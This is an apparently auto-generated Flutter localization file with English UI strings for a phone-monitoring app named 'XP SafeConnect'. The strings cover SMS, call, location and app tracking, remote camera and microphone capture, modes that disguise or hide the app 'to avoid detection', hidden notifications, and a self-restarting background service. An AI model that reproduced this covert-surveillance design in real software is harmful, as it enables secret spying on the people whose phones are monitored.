// ignore: unused_import
import 'package:intl/intl.dart' as intl;
import 'app_localizations.dart';

// ignore_for_file: type=lint

/// The translations for English (`en`).
class AppLocalizationsEn extends AppLocalizations {
  AppLocalizationsEn([String locale = 'en']) : super(locale);

  @override
  String get appName => 'XP SafeConnect';

  @override
  String get welcomeToSafeConnect => 'Welcome to XP SafeConnect';

  @override
  String get pairingScreenDescription => 'Please enter the pairing code provided by the monitoring device to start the setup process.';

  @override
  String get pairingCode => 'Pairing Code';

  @override
  String get enterPairingCode => 'Enter the 6-digit code';

  @override
  String get pairingCodeRequired => 'Please enter the pairing code';

  @override
  String get continueText => 'Continue';

  @override
  String get cancel => 'Cancel';

  @override
  String get exitSetup => 'Exit Setup';

  @override
  String get exitSetupConfirmation => 'Are you sure you want to exit the setup? This will close the application.';

  @override
  String get exit => 'Exit';

  @override
  String get requiredPermissions => 'Required Permissions';

  @override
  String permissionTitle(String title) {
    return '$title';
  }

  @override
  String permissionDescription(String description) {
    return '$description';
  }

  @override
  String get locationPermission => 'Location';

  @override
  String get locationPermissionDescription => 'Allows tracking of your device\'s location in real-time. This is required for the monitoring device to see where you are.';

  @override
  String get smsPermission => 'SMS Messages';

  @override
  String get smsPermissionDescription => 'Allows access to SMS messages sent and received on this device.';

  @override
  String get phonePermission => 'Phone Calls';

  @override
  String get phonePermissionDescription => 'Allows monitoring of incoming and outgoing calls on this device.';

  @override
  String get storagePermission => 'Storage';

  @override
  String get storagePermissionDescription => 'Allows access to images and other files stored on this device.';

  @override
  String get cameraPermission => 'Camera';

  @override
  String get cameraPermissionDescription => 'Allows remote capture of photos using this device\'s camera when requested.';

  @override
  String get microphonePermission => 'Microphone';

  @override
  String get microphonePermissionDescription => 'Allows remote audio recording using this device\'s microphone when requested.';

  @override
  String get requiredPermission => 'Required';

  @override
  String get permissionGranted => 'Permission granted';

  @override
  String get permissionRequired => 'Permission required';

  @override
  String get grantPermission => 'Grant Permission';

  @override
  String get back => 'Back';

  @override
  String get continueToSetup => 'Continue to Setup';

  @override
  String get finalSetup => 'Final Setup';

  @override
  String get permissionsGranted => 'Permissions Granted!';

  @override
  String get displayMode => 'Display Mode';

  @override
  String get displayModeNormal => 'Normal';

  @override
  String get displayModeNormalDesc => 'The app icon and name will be visible in the app drawer.';

  @override
  String get displayModeDiscrete => 'Discrete';

  @override
  String get displayModeDiscreteDesc => 'The app will use a generic name and icon to avoid detection.';

  @override
  String get displayModeHidden => 'Hidden';

  @override
  String get displayModeHiddenDesc => 'The app will not appear in the app drawer (access via phone dial code).';

  @override
  String get autoStart => 'Auto-Start';

  @override
  String get autoStartDescription => 'Automatically start the app when the device boots up.';

  @override
  String get notificationMode => 'Notification Mode';

  @override
  String get notificationModeVisible => 'Visible';

  @override
  String get notificationModeVisibleDesc => 'Normal notifications with app name and icon.';

  @override
  String get notificationModeMinimized => 'Minimized';

  @override
  String get notificationModeMinimizedDesc => 'Compact notifications with minimal information.';

  @override
  String get notificationModeHidden => 'Hidden';

  @override
  String get notificationModeHiddenDesc => 'No visible notifications (background service only).';

  @override
  String get importantInfo => 'Important Information';

  @override
  String get backgroundServiceInfo => 'This app will run continuously in the background to provide monitoring capabilities. This may affect battery life. The background service will automatically restart if terminated.';

  @override
  String get finishSetup => 'Finish Setup';

  @override
  String get errorOccurred => 'Error Occurred';

  @override
  String get close => 'Close';

  @override
  String get settings => 'Settings';

  @override
  String get connected => 'Connected';

  @override
  String get disconnected => 'Disconnected';

  @override
  String connectedToDevice(String device) {
    return 'Connected to $device';
  }

  @override
  String get notConnectedToAnyDevice => 'Not connected to any monitoring device';

  @override
  String get monitoringStatus => 'Monitoring Status';

  @override
  String get locationTracking => 'Location Tracking';

  @override
  String get messageMonitoring => 'Message Monitoring';

  @override
  String get callsMonitoring => 'Calls Monitoring';

  @override
  String get appsMonitoring => 'Apps Monitoring';

  @override
  String get photosAccess => 'Photos Access';

  @override
  String get quickActions => 'Quick Actions';

  @override
  String get viewSharedData => 'View Shared Data';

  @override
  String get contactMonitor => 'Contact Monitor';

  @override
  String get featureComingSoon => 'This feature is coming soon';

  @override
  String get holdForEmergency => 'Hold for Emergency';

  @override
  String featureActiveAndSharing(String feature) {
    return '$feature is active and sharing data';
  }

  @override
  String featureNotActive(String feature) {
    return '$feature is not active';
  }

  @override
  String get sharedData => 'Shared Data';

  @override
  String get aboutSharedData => 'About Shared Data';

  @override
  String get sharedDataExplanation => 'This screen shows you what data is being shared with the monitoring device. You cannot disable these features as they are part of the monitoring agreement.';

  @override
  String get location => 'Location';

  @override
  String get messages => 'Messages';

  @override
  String get calls => 'Calls';

  @override
  String get apps => 'Apps';

  @override
  String get photos => 'Photos';

  @override
  String get active => 'Active';

  @override
  String get inactive => 'Inactive';

  @override
  String lastSyncTime(String time) {
    return 'Last sync: $time';
  }

  @override
  String get viewPrivacyPolicy => 'View Privacy Policy';

  @override
  String get locationSharingDescription => 'Your current location is being shared with the monitoring device in real-time. This includes your GPS coordinates, accuracy, and movement speed.';

  @override
  String get messagesSharingDescription => 'Your SMS messages and some messaging apps content are being shared with the monitoring device.';

  @override
  String get callsSharingDescription => 'Information about your incoming and outgoing calls is being shared, including the phone number, contact name, and call duration.';

  @override
  String get appsSharingDescription => 'Information about apps you use and how long you use them is being shared with the monitoring device.';

  @override
  String get photosSharingDescription => 'Photos access is currently not enabled on this device.';

  @override
  String get emergencyMode => 'Emergency Mode';

  @override
  String get emergencyModeActive => 'EMERGENCY MODE ACTIVE';

  @override
  String get emergencyModeDescription => 'In an emergency situation, tap the button below to alert the monitoring device. They will be notified immediately and can take appropriate action.';

  @override
  String get tapToActivate => 'Tap to Activate';

  @override
  String get emergencyModeWarning => 'Only use this in case of a genuine emergency. False alarms may result in restriction of this feature.';

  @override
  String activatingEmergencyIn(String seconds) {
    return 'Activating emergency mode in ${seconds}s';
  }

  @override
  String get cancelEmergency => 'Cancel';

  @override
  String get tapToCancelEmergency => 'Tap to cancel emergency activation';

  @override
  String get emergencyModeActivated => 'Emergency Mode Activated';

  @override
  String get monitoringDeviceNotified => 'The monitoring device has been notified of your emergency situation.';

  @override
  String get emergencyActions => 'Emergency Actions';

  @override
  String get takePhoto => 'Take Photo';

  @override
  String get recordAudio => 'Record Audio';

  @override
  String get sendMessage => 'Send Message';

  @override
  String get deactivateEmergencyMode => 'Deactivate Emergency Mode';

  @override
  String get justNow => 'just now';

  @override
  String minutesAgo(String minutes) {
    return '$minutes minutes ago';
  }

  @override
  String hoursAgo(String hours) {
    return '$hours hours ago';
  }

  @override
  String daysAgo(String days) {
    return '$days days ago';
  }

  @override
  String get remoteUnlockRequested => 'Remote unlock requested';

  @override
  String get deviceUnlocked => 'Device unlocked';

  @override
  String get unlockPermissionRequired => 'This application needs permission to unlock your device';

  @override
  String get scanQRCode => 'Scan QR Code';

  @override
  String get qrScanInstructions => 'Position the QR code within the frame to scan it';

  @override
  String get enterCodeManually => 'Enter code manually';

  @override
  String get invalidQRCode => 'Invalid QR code format';

  @override
  String get error => 'Error';

  @override
  String get ok => 'OK';

  @override
  String get confirm => 'Confirm';
}
